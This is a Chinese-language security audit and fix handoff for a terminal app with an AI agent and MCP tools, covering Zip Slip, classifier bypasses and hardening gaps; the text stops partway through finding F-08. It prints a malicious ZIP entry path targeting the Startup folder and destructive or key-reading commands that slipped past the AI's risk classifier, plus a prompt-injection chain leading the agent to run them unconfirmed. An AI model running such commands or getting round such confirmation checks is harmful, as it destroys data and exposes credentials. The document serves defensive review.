# 安全审查问题清单与修复指引（供后续修复使用）

> 日期：2026-10-18
> 审查基线：`1e358761`（分支 `fix/ime-offscreen-duplicate`，已合入 `sec/high-fixes`）
> 范围：Go 后端（`app*.go`、`backend/**`）+ Vue/TS 前端（`frontend/src/**`）+ 依赖与构建流程
> 性质：**本次只做审查，未修改任何代码**。本文档是唯一的修复依据/交接单。
> **修复：2026-10-19 已按本文档完成全部 12 项 finding**（每项独立提交，见文末状态表；F-12.10 按文档要求本次不重构；F-12.1 随 F-06 一并修复，F-12.11 的文档部分随 F-12.9）。验证：`go vet ./...`、`go test ./...`、`npx vue-tsc --noEmit`、`npx vitest run`（88 files / 924 tests）、`npm run build`、`govulncheck`（0 可达漏洞）、`npm audit --omit=dev`（0）、`scripts/check-fork-advisories.py`（0 可达，1 条未导入跳过）全绿。
> 方法：关键路径逐行阅读、静态模式检索、`go vet ./...`（通过，exit 0）、`govulncheck ./...`、`npm audit --omit=dev`、对风险分类器做独立复现测试。

---

## 0. 给修复模型（你）的执行须知

1. **先读仓库约束**：`AGENTS.md`（Vue 3 `<script setup>`、Element Plus、i18n 全量翻译、Pinia 直连 store 文件、Go UUID/RWMutex 风格、严格 TS）。另见 `frontend/src/AGENTS.md`（若存在）。
2. **不要削弱已有加固**。本仓库有多轮安全加固痕迹（注释里的 `security.md #N`、`F-xxx`、`SEC-xx`、`STORE-xx`、`SYNC-P1-1` 等）。修复时必须保留：
   - `fileGrants`（`file_grants.go`）与所有 `requireFileGrant/requireDirGrant`
   - `backend/utils/path.go` 的 `SafeLocalJoin` / `SafeRemoteName`
   - known_hosts TOFU 的 fail-closed 语义（`backend/session/knownhosts.go`）
   - 更新包签名校验链（`backend/update/*`）
   - 渲染层 redaction（`LoadConnections`/`LoadIdentities`/`LoadProxies` 不返回明文）
   - `golang.org/x/crypto` 等 fork 替换（见 F-12 供应链，**不要**随手改回上游，除非同时评估 X11/mosh 功能）
3. **禁止**：编辑 `frontend/wailsjs/go/models.ts`（自动生成）；改动 `frontend/vendor/*` 与 `frontend/src/vendor/spice-html5.js` 的第三方代码；引入 ESLint/Prettier；给未翻译的 UI 文案。
4. **一次只修一个 finding**，每个 finding 独立提交，提交信息遵循 `fix(scope): description`。每个改动都要有回归测试（Go 用表驱动，前端用 vitest）。
5. 行号基于 `1e358761`，可能随其他修复漂移；以符号名/函数名定位为准。
6. 本文档末尾的"状态跟踪表"请在修复后更新（`未开始 / 进行中 / 已修复 / 有意不修`）。

### 验证命令

```bash
# 后端
go vet ./...
go test ./backend/... 
go test ./...                       # app 层测试（Windows 下部分用例依赖平台）
# 单包
go test ./backend/mcp ./backend/store ./backend/session ./backend/database

# 前端
cd frontend
npx vue-tsc --noEmit                # 严格类型检查
npx vitest run                      # 单元测试
npm run build                       # 构建检查

# 依赖扫描（当前环境可复现）
go run golang.org/x/vuln/cmd/govulncheck@latest ./...
cd frontend && npm audit --omit=dev
```

> 注：`go test -race` 需要 cgo，在当前 Windows 环境不可用；并发相关改动请额外用静态审阅 + 单线程测试覆盖。

---

## 1. 问题总表

| ID | 等级 | 一句话 | 主位置 | 状态 |
|---|---|---|---|---|
| F-01 | **高** | 技能 ZIP 导入 Zip Slip → 任意文件写入 | `backend/store/skills_store.go:704-731` | 已修复 |
| F-02 | **高** | 危险命令分类器可绕过 + AI 默认 `confirm_dangerous` | `backend/mcp/risk.go`、`frontend/src/services/agent.ts`、`frontend/src/stores/aiStore.ts:214` | 已修复 |
| F-03 | **高** | 外部 MCP Client 工具完全绕过确认 | `frontend/src/services/agent.ts:1529-1531` | 已修复 |
| F-04 | 中 | 本地文件面板 root 约束可被 `SftpListLocal("/")` 解除；仅词法包含 | `app_file_transfer.go:120-132,172-200` | 已修复 |
| F-05 | 中 | 依赖漏洞：x/image、js-yaml、x/net（+ 2 条误报说明） | `go.mod`、`frontend/package.json` | 已修复 |
| F-06 | 中 | MCP HTTP 服务加固缺口（超时/限流/Origin/Scope/审计轮转） | `backend/mcp/server.go:247-249,309,353`、`app_mcp.go:848-860` | 已修复 |
| F-07 | 中 | AI baseURL 不强制 HTTPS；`FetchModels` 响应体无上限 | `app_ai.go:129,1445,1489` | 已修复 |
| F-08 | 中 | 终端原文写入明文日志 | `frontend/src/components/BaseTerminal.vue:588-595` | 已修复 |
| F-09 | 中 | 无 CSP、未拦截 webview 导航（Wails 对任意页面注入 runtime） | `frontend/index.html`、`main.go:388+` | 已修复 |
| F-10 | 中低 | 管理员 shell broker 未校验 `Env`/`WorkDir` | `backend/session/local_admin_broker_windows.go:351-357` | 已修复 |
| F-11 | 中低 | SQL 标识符拼接（Oracle/MySQL） | `backend/database/provider_oracle.go:405-408`、`provider_mysql.go:486,500,513` | 已修复 |
| F-12 | 低 | 工程/流程类：日志轮转、目录权限、API 小缺陷、供应链、CI 扫描、`SECURITY.md` 等 | 见正文 | 已修复 |

---

## 2. 详细问题与修复指引

### F-01（高）技能 ZIP 导入 Zip Slip — 任意文件写入

**状态**：已修复
**位置**：`backend/store/skills_store.go` `ImportFromZip`（`:650` 起，漏洞在 `:704-731`）

**证据**

```go
// skills_store.go:696-720
tmpDir, err := os.MkdirTemp("", "uniterm-skill-import-")
...
for _, f := range r.File {
    if f.FileInfo().IsDir() { continue }
    rel := strings.TrimPrefix(f.Name, root+"/")   // ← 无校验
    if rel == f.Name { rel = filepath.Base(f.Name) }
    target := filepath.Join(tmpDir, rel)          // ← filepath.Join 会穿出 tmpDir
    if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil { ... }
    out, err := os.Create(target)                 // ← 任意可写路径
```

**根因**：`rel` 只做了前缀裁剪，没有拒绝 `..` 段、绝对路径、盘符前缀、反斜杠变体；`filepath.Join` 对 `..` 正常做词法归一，因此 `skill/../../x` → `tmpDir/../../x`。同文件里 `entries[0].dir` 只取第一个 `/` 前的段，所以恶意 ZIP 只要包含 `evil/SKILL.md` 就能通过合法性检查。

**利用场景（需要用户操作一次）**
1. 攻击者发给用户一个"技能包"ZIP；
2. ZIP 内容：
   ```
   evil/SKILL.md                      （合法 frontmatter，用于通过校验）
   evil/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/pwn.bat
   ```
3. 用户「设置 → 技能 → 从 ZIP 导入」选择该文件（`app_ai.go:1576` 只校验了文件对话框 grant）；
4. 文件被写到用户任意可写路径 → 启动项持久化 / 覆盖 `~/.ssh/config` / 覆盖应用配置。

**影响**：以用户权限任意文件写入（可覆盖/创建），可升级为代码执行与持久化。ZIP 本身经过 `requireFileGrant`，所以不是静默远程利用。

**修复方向（建议）**

1. 解压循环改用仓库已有工具函数：
   ```go
   target, err := utils.SafeLocalJoin(tmpDir, rel)
   if err != nil { return "", fmt.Errorf("unsafe zip entry %q: %w", f.Name, err) }
   ```
   `SafeLocalJoin` 已覆盖 `..`、绝对路径、盘符/UNC、双分隔符、NUL、Windows 保留名、`filepath.Rel` 复核。
2. 跳过符号链接/硬链接 entry（`f.Mode()&os.ModeSymlink != 0`），现在只判断了 `IsDir()`。
3. 对 `root` 的推导也做校验：`root` 必须是单个安全路径段（`utils.SafeRemoteName(root)`），否则整个 ZIP 拒绝。
4. 解压完、拷入 skills 目录前调用 `assertNoSymlinks(tmpDir)`（该函数已存在于同文件 `:605`）。
5. 顺带把 `ImportFromDir` 的 `srcDir` 校验补齐（现在只 `readCapped(SKILL.md)`；`copyDir` 已有 `assertNoSymlinks`，风险较低，但建议一致化）。

**涉及文件**
- `backend/store/skills_store.go`
- `backend/utils/path.go`（只读复用，无需改）
- 可能新增：`backend/store/skills_store_zip_test.go`

**测试要求**
- 新增表驱动测试：条目 `../x`、`../../x`、`/abs/x`、`C:\x`、`a\..\..\x`、`evil/../../x`、symlink entry → 全部返回 error，且断言 `tmpDir` 之外没有文件生成（用临时 HOME 或 `t.TempDir()` + 检查哨兵路径不存在）。
- 正常 ZIP（`skill/SKILL.md` + `skill/references/a.md`）仍能导入成功。
- 先写测试复现失败，再修复。

**验收标准**
- `go test ./backend/store -run Skill` 通过，且恶意 ZIP 用例断言"目录外无文件"。
- 不改变正常导入的落盘结构与 `skills.json` 偏好写入行为。

**回归风险**：注意不要破坏 `importToDir` 的"覆盖已有同名技能"语义（`os.RemoveAll(dst)`），也不要改变 `skillNameRe` 校验。

---

### F-02（高）危险命令分类器可绕过 + 内置 AI 默认策略过宽

**状态**：已修复
**位置**
- 后端规则：`backend/mcp/risk.go`（`stripWrappers:187`、`classifySegment:101`、`readOnlyHeads:462`、`readOnlySubs:493`）
- 前端同一份规则的镜像：`frontend/src/services/agent.ts`（`stripWrappers` 附近、`READ_HEADS:~326`、`classifySegment:~384`）
- AI 默认模式：`frontend/src/stores/aiStore.ts:214`（`mode = ref<ExecutionMode>('confirm_dangerous')`）
- MCP 默认策略（对照）：`backend/store/settings_store.go:162`（`Policy: "confirm_write"`）
- 决策函数：`frontend/src/services/agent.ts:getRisk:449`、`shouldConfirm:463`；`backend/mcp/tools.go:gateExec:304`

**证据（已实测，非推断）**

把 `risk.go` 复制到独立模块并直接调用 `classifyCommand`，结果（`0=read, 1=write, 2=dangerous`）：

```
rm -rf /tmp/x                => 2 dangerous
sudo -n rm -rf /tmp/x        => 2 dangerous
sh -c 'rm -rf /tmp/x'        => 2 dangerous

nice -n 5 rm -rf /tmp/x      => 1 write    ← 默认 confirm_dangerous 下免确认执行
time -p rm -rf /tmp/x        => 1 write    ← 同上
env -S 'rm -rf /tmp/x'       => 1 write    ← 同上（env -S 会拆分并执行）
python3 -c '...rmtree(...)'  => 1 write    ← 解释器一行式同样漏判

sort -o /tmp/out /etc/hosts  => 0 read     ← 实际写文件
git log --output=/tmp/out    => 0 read     ← 实际写文件
find /tmp -fprint /tmp/out   => 0 read     ← 实际写文件
date -s 20200101             => 0 read     ← 改系统时间
cat ~/.ssh/id_rsa            => 0 read     ← 静默读取密钥
```

**根因**
1. `stripWrappers` 只对 `sudo/doas` 跳过带参选项（`privOptionArgs`）；`nice`、`time`、`env`、`exec` 直接剥掉后被当作命令头，`-n`/`-p`/`-S` 变成 head → `normalizeHead("-n")` 不在只读表 → 落到 `RiskWrite`。而 `RiskWrite` 在 `confirm_dangerous` 模式下**不弹确认**。
2. `evalFlagHeads`（`risk.go:284`）对解释器 `-c/-e` 只保证"至少 write"（`classifyNested` 返回 `RiskWrite` 下限），所以任何 `python3 -c / node -e / perl -e` 都是 write。
3. 只读白名单里的命令存在"带副作用的选项"：`sort -o`、`git log --output`、`find -fprint/-fls/-ok`、`date -s`、`hostname <arg>`、`less/more/man` 的交互式 shell 逃逸等。规则只检查了 `>` 重定向，没有检查这些选项。
4. 前端 `agent.ts` 与后端 `risk.go` 是两份手写规则，必须"逐条保持同步"，存在漂移风险。
5. AI 默认 `confirm_dangerous` 与 MCP 默认 `confirm_write` 不一致；`aiStore.mode` 也未持久化，每次启动回到宽松值。

**影响与利用链**：终端输出 / 远端文件 / 网页内容可对模型做 prompt injection → 模型调用 `execute_command` → 默认模式下 `nice -n 5 rm -rf …`、`python3 -c '...'` 等**不弹确认**即执行；只读分类可被用来静默读取密钥并写入文件（`sort -o`/`git --output`），或把密钥内容回传给模型提供方（`cat ~/.ssh/id_rsa` 属 read，静默执行）。确认框是这套系统唯一的安全边界，因此分类器必须偏保守。

**修复方向（建议，按优先级）**

1. **默认策略**：`frontend/src/stores/aiStore.ts:214` 改为 `'confirm_write'`（与 MCP 一致）；把 `mode` 持久化到 settings/ai 配置，重启不重置。UI 文案同步（i18n 9 个 locale）。
2. **收紧分类器（Go 与 TS 同时改，保持逐条一致）**：
   - 包装器选项表：为 `nice` 增加 `-n/--adjustment`（带参）、`time` 增加 `-p/-f/-o/--output`（`-o` 带参）、`env` 增加 `-S/--split-string`、`-u/--unset`（带参）、`-C/--chdir`（带参）、`-i/-0` 等；`exec` 的 `-a` 带参。更稳妥的做法是：**遇到未知包装器选项就 downgrade 到 dangerous**（默认关闭）。
   - `env -S` / `xargs` / `eval` / 解释器 `-c/-e/--eval`：一律 `RiskDangerous`（现在是 write 下限）。
   - 只读命令的写选项：`sort -o/--output`、`git log/diff/show --output`、`find -fprint/-fprint0/-fprintf/-fls/-ok/-okdir`、`date -s/--set`、`hostname <arg>`、`tee` 已不在只读、`uniq -w` 无副作用可不处理。建议改为**按命令维护"只读选项白名单"**，出现白名单外选项即降级为 write；只读命令带未知选项时默认 write 而不是 read。
   - 把 `readOnlyHeads` 里明确能执行子进程/写文件的项移除或加限制：`less`、`more`、`man`、`top`、`jq`（`jq -f` 读文件）、`strings` 无副作用可留。
3. **单一实现**：把权威实现留在 Go（`backend/mcp` 导出 `ClassifyCommand`），前端通过 Wails 绑定调用；若因延迟不能同步调用，则**至少**加一份"跨语言一致性测试"（同一组用例在 Go 测试 + vitest 中共享 JSON fixture）。当前无共享 fixture。
4. **补充测试**：把本文档附录 A 的全部用例写进 `backend/mcp/risk_test.go` 与 `frontend/src/services/agent.risk.test.ts`，先失败后修复；再补一条"只读命令的每个危险选项都必须 ≥ write"的表驱动用例。

**涉及文件**
- `backend/mcp/risk.go`
- `frontend/src/services/agent.ts`
- `frontend/src/stores/aiStore.ts`
- `backend/mcp/risk_test.go`、`frontend/src/services/agent.risk.test.ts`
- 可能新增：`frontend/src/services/riskFixture.json`（两端共享用例）
- i18n：`frontend/src/i18n/locales/*.json`（仅当调整默认值文案）

**验收标准**
- 附录 A 的矩阵在两端输出一致，且 `nice/time/env -S/解释器 -c` 全部 ≥ dangerous。
- 默认模式为 `confirm_write`，且用户选择可持久化。
- `confirm_dangerous` 下上述破坏性命令必须弹框。

**回归风险**
- 收紧后误报率上升（如 `sort` 带 `-k` 也会变 write）。用"未知选项 → write"而不是"未知选项 → dangerous"，避免打扰用户过多；但解释器/`-S`/`eval` 必须 dangerous。
- 注意 `classifyNested` 的递归与 `splitSegments` 的 `&` 处理不要被破坏。
- 前端测试 `agent.confirmPanel.test.ts`、`agent.sendTerminalKey.test.ts` 依赖现有风险行为，改完要一起跑。

---

### F-03（高）外部 MCP Client 工具完全绕过确认

**状态**：已修复
**位置**：`frontend/src/services/agent.ts:1529-1531`（`isRemoteMCPTool` 分支）；相关：`frontend/src/services/mcpTools.ts:82-86`、设置页 `frontend/src/components/SettingsTab.vue:1357+`

**证据**

```ts
} else if (isRemoteMCPTool(tu.name)) {
  // External MCP client tool: route straight to the Go manager. Arguments
  // are passed through as the model supplied them; no terminal/risk gating.
  const result = await callRemoteMCPTool(tu.name, tu.input as Record<string, unknown>)
```

同一文件里，`execute_command` / `start_command` / `send_terminal_key` 都走 `getRisk()` + `shouldConfirm()`；本地 `capture_terminal` / `collect_output` 属只读；唯独外部 MCP 工具没有任何确认。

**影响**：用户配置一个 filesystem / shell / git 类 MCP server 后，prompt injection 可让模型**无提示**调用其破坏性工具（写文件、删目录、推送代码、发起网络请求），参数完全由模型控制。设置页只写"扩展 AI 能力"，没有任何风险提示（`settings.mcpClientSectionDesc`）。

**修复方向（建议）**

1. 在 `agent.ts` 的工具分发中，把 `isRemoteMCPTool` 分支纳入确认流程：
   - 默认按 `dangerous` 处理（除非用户在 MCP 客户端配置里显式声明只读/可信）；
   - 复用 `store.setPendingCommand` 的确认面板/`ask_user` 机制，展示 server 名 + tool 名 + JSON 参数（参数截断显示，但确认的是全文）；
   - 拒绝后返回 `tool` 消息说明"用户拒绝"，不要抛异常中断会话。
2. 数据结构扩展：`store.MCPClientConfig` 增加 `trusted` / `readOnly` 或按工具名的 allowlist（考虑 sync 兼容：`mcp_clients.json` 已在 `store/filestore.go` 的 `SecretFiles` 里，增加非敏感字段不需要改加密清单）。
3. 设置页增加明确文案（9 个 locale）：外部工具调用会影响真实系统，默认需要确认。
4. 可选：在 `runAgent` 里对同一轮的重复调用做合并确认（多个只读工具一次确认），避免刷屏。

**涉及文件**
- `frontend/src/services/agent.ts`
- `frontend/src/services/mcpTools.ts`（如需暴露 tool 元数据/描述用于确认面板）
- `frontend/src/stores/aiStore.ts`（pendingCommand 结构可能需要扩展 `mcpTool` 字段）
- `frontend/src/components/AIMessage.vue`（确认面板展示外部工具参数）
- `backend/store/mcp_client_store.go`（可选：持久化信任级别）
- `frontend/src/i18n/locales/*.json`

**测试要求**
- vitest：mock `callRemoteMCPTool`，断言默认情况下不会直接调用，而是进入 `confirming`；用户同意后才调用；拒绝时返回拒绝消息且会话继续。
- 新增 `frontend/src/services/agent.mcpTool.test.ts`。

**验收标准**
- 外部 MCP 工具默认必须确认；配置为可信后可直接调用（且 UI 有明确标识）。

**回归风险**：不要影响 `mcpApprovalQueue.ts` 的现有排队逻辑（那是 uniTerm 作为 MCP server 的审批队列，与本项方向相反）。

---

### F-04（中）本地文件面板 root 约束可被解除 + 仅词法包含

**状态**：已修复
**位置**
- `app_file_transfer.go:120-132`（`SftpListLocal`）
- `app_file_transfer.go:150-200`（`noteSftpLocalDir` / `pathWithinRoots` / `requireSftpLocalPath` / `requireLocalPanePath`）
- `app_file_transfer.go:344-405`（`SftpLocalGetContent/PutContent/Copy/Move/...`）

**证据**

```go
// app_file_transfer.go:120
func (a *App) SftpListLocal(sessionID, dir string) (session.FileListResult, error) {
    fs, err := a.getSftp(sessionID)
    ...
    res, err := fs.ListLocal(dir)
    if err == nil {
        // 任何成功列目录都注册为该会话的本地 root
        a.noteSftpLocalDir(sessionID, res.Dir)
    }
    return res, err
}
```

```go
// app_file_transfer.go:172-200
func (a *App) requireSftpLocalPath(sessionID, p string) error {
    if err := rejectDotDotPath(p); err != nil { return err }
    clean := filepath.Clean(p)
    ...
    if !pathWithinRoots(clean, clone) { return fmt.Errorf(...) }   // 纯词法
    return nil
}
```

**根因/影响**
1. 门禁的"信任来源"是"面板导航过的目录"，但注册动作就是 `SftpListLocal` 本身；renderer 只要调用 `SftpListLocal(sid, "/")`（或 `C:\`、`$HOME`），该路径即成为 root，随后所有 `SftpLocal*` 读写删操作都被放行。注释里声明的"compromised renderer 不能把文件会话当任意读写原语"（`file_grants.go` 顶部注释）实际不成立。
2. `pathWithinRoots` 用 `filepath.Rel` 做纯词法判断，不解析符号链接：root 内的软链指向外部时仍可读写外部目标。`utils.SafeLocalJoin` 的注释也承认"lexical only; 需要防符号链接请用 `os.Root`"。

**修复方向（建议）**

1. **分离"注册"与"列举"**：`SftpListLocal` 不再自动注册 root。改为：
   - 用户通过目录对话框（`OpenDirectoryDialog`）或拖放选择目录 → 注册 root（已有 `fileGrants.addDir` 通道）；
   - 面板内的上级/子级导航只在**已授权 root 内部**移动（`filepath.Rel` 校验），不允许借 `SftpListLocal` 把 root 扩展到 `/`；
   - 明确拒绝注册根目录/盘符根（`/`、`C:\`、`\\server\share` 作为 root 需要单独的高风险确认）。
2. **符号链接**：所有写/删/改操作在 `requireSftpLocalPath` 之后，对最终路径做 `filepath.EvalSymlinks`（对不存在的目标解析最近存在的祖先，参考 `ResolveMcpLocalPath` 的实现 `backend/mcp/tools_file.go:15-70`）再复核包含关系；或改用 Go 1.24+ 的 `os.Root` 全程句柄化。
3. 保持 `rejectDotDotPath` 现状（远程文件名防护已经做得对，见 `backend/session/sftp_session.go:1489` 与 `utils.SafeRemoteName`）。

**涉及文件**
- `app_file_transfer.go`
- `frontend/src/composables/useFilePanel.ts` / `frontend/src/components/SftpTabContent.vue`（如改变导航注册语义，需要同步"选择目录"入口）
- 测试：`app_file_transfer_test.go`（若不存在则新建）

**测试要求**
- 断言 `SftpListLocal(sid, "/")` 后 `SftpLocalPutContent(sid, "/tmp/x", ...)` 仍被拒绝（除非用户显式授权过该目录）。
- 断言 root 内软链指向外部时读写被拒绝。
- 现有 SFTP 面板功能（浏览/上传/下载/重命名）回归通过。

**验收标准**：不能通过一个"列举"调用扩大写权限；符号链接不可逃逸。

**回归风险**：如果 UI 依赖"浏览即授权"，需要同时提供"选择目录"入口，否则会削弱正常易用性。注意 `app_file_transfer.go:209` 附近还有一段 `fileGrants.allows(clean)` 的兼容逻辑，改动时一并梳理。

---

### F-05（中）依赖漏洞

**状态**：已修复
**位置**：`go.mod` / `go.sum` / `frontend/package.json`

**扫描结果（可复现）**

`go run golang.org/x/vuln/cmd/govulncheck@latest ./...`：

| 漏洞 | 模块 | 当前 | 修复版本 | 说明 |
|---|---|---|---|---|
| GO-2026-5061 | `golang.org/x/image` | v0.41.0 | ≥ v0.43.0 | webp VP8 alpha 尺寸不匹配 panic；Symbol 可达（`webp.init` 注册解码器） |
| GO-2026-6222 | 同上 | v0.41.0 | ≥ v0.45.0 | VP8L 解码过量内存 |
| GO-2026-4961 | 同上 | v0.41.0 | ≥ v0.42.0 | 32 位大图 panic |

可达入口：`app_ai.go:21` 注册 webp 解码器；`app_ai.go:1812` 对 renderer 传入的 base64 附件执行 `image.DecodeConfig`。当前只调 `DecodeConfig`（告警主要针对 `Decode`），**现实可利用性低**，但附件是不可信输入。

`x/net v0.58.0` 另有 5 条 HTTP/2 告警（修复 ≥ v0.60.0）。本应用的 MCP 服务是明文 HTTP/1.1 127.0.0.1，未直接用 http2，风险低。

`cd frontend && npm audit --omit=dev`：

| 包 | 级别 | 评估 |
|---|---|---|
| `@vue/server-renderer <3.5.42`（XSS） | high | 纯客户端 SPA，不走 SSR → **当前不可利用**；仍建议升级 |
| `js-yaml 5.3.0`（merge key CPU DoS） | moderate | **实际使用**：`frontend/src/components/K8sDetailDrawer.vue:89` 解析/编辑 YAML；恶意 manifest 可造成解析耗时；升级 ≥5.4.1，并为解析加大小/时间限制 |
| `source-map-js` | high | 仅构建期依赖，不随应用分发 → **可忽略** |

**修复方向**

1. `go get golang.org/x/image@v0.45.0 golang.org/x/net@v0.60.0`（注意 `golang.org/x/crypto` 有 `replace` 到 fork，不要误改）；`go mod tidy`。
2. 前端 `npm audit fix`（确认 lockfile 变更只涉及上述包）；`js-yaml` 显式升级到 ≥5.4.1。
3. 在 `K8sDetailDrawer.vue` 的 YAML 解析入口加大小上限（例如 2MB）与 try/catch 超时保护（解析本身同步，无法超时，至少限制输入大小）。
4. 把依赖扫描接进 CI（见 F-12）。

**涉及文件**：`go.mod`、`go.sum`、`frontend/package.json`、`frontend/package-lock.json`、`frontend/src/components/K8sDetailDrawer.vue`、`.github/workflows/build.yml`

**测试要求**
- `go build ./...`、`go vet ./...`、`go test ./...` 全绿；重点跑 `./backend/...` 与 `app_*_test.go`。
- 前端 `npx vitest run`、`npx vue-tsc --noEmit`、`npm run build`。
- 附件校验相关：`app_ai_test.go`（含 FR-3/FR-6 用例）。

**验收标准**：`govulncheck` 无 Symbol/Package 级告警；`npm audit --omit=dev` 仅剩已说明的误报或为空。

**回归风险**：`x/image` 升级可能影响 webp 解析行为；只用 `DecodeConfig` 应无影响，但请保留附件测试。

---

### F-06（中）MCP 服务端加固缺口

**状态**：已修复
**位置**
- `backend/mcp/server.go:283-330`（`Start`）、`:309`（http.Server）、`:353-382`（`authMiddleware`）
- `backend/mcp/server.go:247-251`（`TokenInfo.Scope`）
- `app_mcp.go:239-249`（`mcpLoadTokens` 只填 `Name`）、`:253-280`（`mcpResolveToken` mtime 缓存）、`:846-860`（审计日志）
- `backend/mcp/tools.go:304-340`（`gateExec`/`gateConnect`）

**已确认的问题**
1. **无 HTTP 超时**：`httpSrv := &http.Server{Handler: mux}`，没有 `ReadHeaderTimeout` / `ReadTimeout` / `WriteTimeout` / `IdleTimeout`。本机任意进程可 Slowloris 或发超大 body（SDK handler 未限制 body）。
2. **无 `Origin`/`Host` 校验**：目前依赖 Bearer token，浏览器跨站因 preflight 无法带自定义头，**不构成直接绕过**；但作为纵深防御应加白名单/拒绝浏览器 Origin。
3. **`TokenInfo.Scope` 是死字段**：从未赋值、从未校验。任何 token 都拥有全部工具（exec / 文件读写 / send-key / connect）。要么删除，要么实现按 token 的 scope（如 `exec`、`files`、`readonly`）。
4. **撤销生效依赖 mtime**：`mcpResolveToken` 通过 `os.Stat` 的 mtime 判断是否重读 `mcp.json`；建议改为内存 map 原子替换（`SetTokens` 已存在，`mcpWriteTokens` 也已调用），去掉 mtime 缓存或同时比对 size+hash。
5. **审计日志无轮转**：`mcp-audit.log` 只 `O_APPEND`，无大小上限；且记录完整命令行（可能含密码）。建议按大小轮转（参考 `backend/log` 的 `rotateLocked`）或改用 `log` 包。
6. **审批弹窗耗尽**：`mcpApprovalSerial` 串行 + 110s 超时，恶意客户端可连续触发审批造成用户疲劳（社会工程）。建议加每客户端并发/速率上限与队列长度上限。
7. 只读工具也记录/回传内容：`uniterm_capture`（`tools_job.go:455`）、`get_command_output`（`tools.go:264`）在默认 `confirm_write` 下**免确认**即可读取终端屏幕与命令输出——屏幕可能含密码。属于设计取舍，但应在 UI/文档中说明，或对 `capture` 单独设策略。

**修复方向（建议）**

```go
httpSrv := &http.Server{
    Handler:           mux,
    ReadHeaderTimeout: 5 * time.Second,
    ReadTimeout:       30 * time.Second,
    WriteTimeout:      0, // SSE/streamable 长连接需要 0 或足够大
    IdleTimeout:       120 * time.Second,
}
```

- 在 `mux` 外层加中间件：拒绝带 `Origin`（非空且非 `127.0.0.1`/`localhost`）或 `Host` 不在白名单的请求；`http.MaxBytesReader` 限制请求体（例如 8MB）。
- Scope：在 `MCPTokenRecord`/`mcp.json` 增加 `scope` 字段（向后兼容缺省 = 全量），`authMiddleware` 把 scope 放进 context，工具 handler 里按 scope 拒绝（`tools.go` 各 `toolXxx` 开头）。
- 审计日志：复用 `backend/log` 的轮转策略，或加 `maxAuditBytes` + `.1` 轮转；同时考虑对命令行做可配置脱敏（至少不记录明显含有 `password=`、`-p<...>` 的片段——但注意脱敏可能影响审计价值，建议保留原文 + 文件 0600 + 用户可关闭）。
- 速率限制：对 `requestApproval` 增加每 token 的滑动窗口（如 10 次/分钟）。

**涉及文件**
- `backend/mcp/server.go`、`backend/mcp/tools.go`、`backend/mcp/tools_job.go`
- `app_mcp.go`
- `store.LocalState`（若把 scope 放到 local state；更合适是 `mcp.json` 的 token 记录）
- 测试：`backend/mcp/server_test.go`、`app_mcp_test.go`

**测试要求**
- `httptest` 断言超时配置生效（可断言 `Server.ReadHeaderTimeout != 0`）。
- 断言带 `Origin: http://evil` 的请求被拒（403）。
- 断言 scope 限制：`files` token 调 `exec_command` 返回 403/工具不可见。
- 断言撤销 token 后下一次请求立即 401（不依赖 sleep/mtime）。

**验收标准**：上述测试全绿，且现有 `server_test.go` 的审批/工具用例不回归。

**回归风险**：`WriteTimeout` 会截断长连接（streamable HTTP / SSE），建议保持 0 或在 `IdleTimeout` 上做；不要阻塞现有审批流程。

---

### F-07（中）AI 端点不强制 HTTPS、响应体无上限

**状态**：已修复
**位置**：`app_ai.go:129`（`ChatCompletion`）、`:1445-1490`（`FetchModels`，`io.ReadAll` 在 `:1489`）

**证据**

```go
func (a *App) ChatCompletion(apiKey, baseURL, model string, requestJSON string, ...) (string, error) {
    // baseURL 直接使用，无 scheme 校验
```

```go
// FetchModels
res, err := client.Do(req)
...
body, err := io.ReadAll(res.Body)      // :1489 无上限
```

对照：WebDAV（`backend/session/webdav_session.go:88-105`）与 sync（`backend/sync/git.go:33-41`）都强制 `https://`。

**影响**
- 用户手滑或从 sync 拉入的模型配置写成 `http://…` → API Key 与整段对话明文上网，可被 MITM 窃取。
- 恶意/故障端点可返回无限响应把进程内存打满（`FetchModels`）。

**修复方向**
1. 在 Go 侧统一校验 baseURL（不要在 TS 侧单独做，避免绕过）：
   - 允许 `https://`；允许 `http://` **仅限** loopback（127.0.0.1/::1/localhost），与 `update.validate.go` 的 `isLoopbackHost` 保持一致的判定；
   - 拒绝其它 scheme（`file:`、`javascript:` 等）。
   - 注意兼容本地 Ollama/LM Studio（通常是 `http://127.0.0.1:11434`）与内网自建端点：若产品需要，提供显式"允许不安全 HTTP"开关并持久化 + UI 警告，而不是静默放行。
2. `FetchModels` 与其它非流式读取统一用 `io.LimitReader(res.Body, N)`，流式 SSE 保持现有的 1MB line buffer（`scanner.Buffer(..., 1024*1024)`）。
3. 错误信息里避免回显含凭据的 URL（现在是回显 base 相关的错误，检查一遍 `chatCompletion*` 的 `fmt.Errorf`）。

**涉及文件**：`app_ai.go`、可能新增 `app_ai_url_test.go`；前端表单提示（`SettingsTab.vue` 模型配置）与 i18n。

**测试要求**
- 表驱动：`https://api.openai.com` OK；`http://127.0.0.1:11434` OK；`http://example.com` 拒绝；`file:///etc/passwd` 拒绝。
- `FetchModels` 返回超大 body 时不 OOM（用 `httptest` 写无限流或超限流，断言错误）。

**验收标准**：非 loopback 的 http 默认拒绝，且有明确错误提示；超大响应返回错误而非崩溃。

**回归风险**：不能把本地模型常用地址误伤；sync 下来的旧配置若是 http 外部地址，会从"能用"变"报错"——需要 UI 明确提示如何修改。

---

### F-08（中）终端原文写入明文日志

**状态**：已修复
**位置**：`frontend/src/components/BaseTerminal.vue:588-595`（`sanitizeTerminalHistory`），调用点 `:1257`

**证据**

```ts
function sanitizeTerminalHistory(text: string): string {
  const cleaned = sanitizeTerminalOutput(text)
  if (cleaned !== text) {
    FrontendLog('sanitizeTerminalHistory', `raw last 400: ${JSON.stringify(text.slice(-400))}`)
    FrontendLog('sanitizeTerminalHistory', `cleaned last 400: ${JSON.stringify(cleaned.slice(-400))}`)
  }
  return cleaned
}
```

**触发条件**：新建/重新挂载终端（例如标签页迁移到工作区、重新连接同一 session）时回放整个 session buffer；只要内容含框线/emoji/替换字符等需要清洗的字符（非常常见），最后 400 字符**终端原文**就写入 `~/.uniterm/uniterm.log`（0600，但长期留存、也常被用户贴到 issue）。

**影响**：终端里出现 `cat .env`、`mysql -pPASS`、`export TOKEN=…`、sudo 提示、`ssh-keygen` 输出等都会落盘到明文日志；属于"调试代码导致敏感信息持久化"。另外 `FrontendLog` 本身不转义换行，可被终端内容伪造日志行（低危）。

**修复方向（建议）**
